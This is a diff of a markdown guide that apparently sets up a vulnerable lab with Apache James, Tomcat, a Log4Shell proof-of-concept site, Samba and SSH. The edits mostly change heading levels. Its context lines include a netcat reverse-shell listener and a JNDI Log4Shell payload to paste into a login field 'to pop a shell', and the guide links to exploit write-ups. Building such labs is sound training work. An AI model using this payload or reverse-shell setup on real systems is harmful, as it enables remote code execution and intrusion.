@@ -80,7 +80,7 @@ usage()
 }
 …
 ```
-# Create Start James server Script with the name startjamesserver.sh
+### Create Start James server Script with the name startjamesserver.sh
 ```
 #startjamesserver.sh
 #!/bin/bash
@@ -119,7 +119,7 @@ Modify the manager section of the tomcat-users.xml file as follows:
 ```
 
 
-## Configure apache-tomcat Listening port
+### Configure apache-tomcat Listening port
 Go to / opt/apache-tomcat-9.0.71/conf/server.xml and change the listening port from 8080 t0 8081 to avoid conflict with log4j port. 
 
 Change ### Connector port="8080" to ### Connector port="8081"
@@ -142,7 +142,7 @@ Change ### Connector port="8080" to ### Connector port="8081"
                redirectPort="8443" />
     -->
 ```
-## Start apache with script name startapache.sh
+### Start apache with script name startapache.sh
 ```
 #!/bin/bash
 cd /opt/tomcat/apache-tomcat-9.0.68/bin
@@ -210,11 +210,11 @@ chmod +x generatelog4jpayload.sh
 ```
 Where generatelog4jpayload.sh is the name of the script above.
 
-# Start reverse shell listerner
+### Start reverse shell listerner
 
 nc -lvnp 9001
 
-# Build the docker image
+### Build the docker image
 ```
 #!/bin/bash
 cd ~/mylog4j/log4j-shell-poc
@@ -225,7 +225,7 @@ Run
 sudo docker build -t log4j-shell-poc .
 if you have not restarted you machine after docker installation
 ```
-# Run docker website
+### Run docker website
 ```
 docker run --network host log4j-shell-poc
 ```
@@ -234,12 +234,12 @@ Once it is running, you can access it on localhost:8080
 Copy the payload ${jndi:ldap://localhost:1389/a} and paste it in the username field of the vulnerable site. Click on the Login button to pop a shell.
 
 # Samba config
-## Create Users password
+### Create Users password
 ```
 sudo adduser username
 sudo smbpasswd -a username
 ```
-## Configure the Samba users in the smb.conf file as follows:
+### Configure the Samba users in the smb.conf file as follows:
 
 ```
 sudo nano /etc/samba/smb.conf
@@ -291,7 +291,7 @@ sudo nano /etc/samba/smb.conf
     force directory mode = 2770
     valid users = james @sadmin
 ```
-# Restart
+### Restart
 sudo systemctl restart smbd
 
 # Crontab configuration
@@ -349,10 +349,8 @@ Accept the default settings
 cat .ssh/id_rsa.pub >> ~/.ssh/authorized_keys
 
 # References
-https://github.com/kozmer/log4j-shell-poc
-
-https://phoenixnap.com/kb/ubuntu-samba
-
-https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html
+* https://github.com/kozmer/log4j-shell-poc
+* https://phoenixnap.com/kb/ubuntu-samba
+* https://crimsonglow.ca/~kjiwa/2016/06/exploiting-apache-james-2.3.2.html
 
 
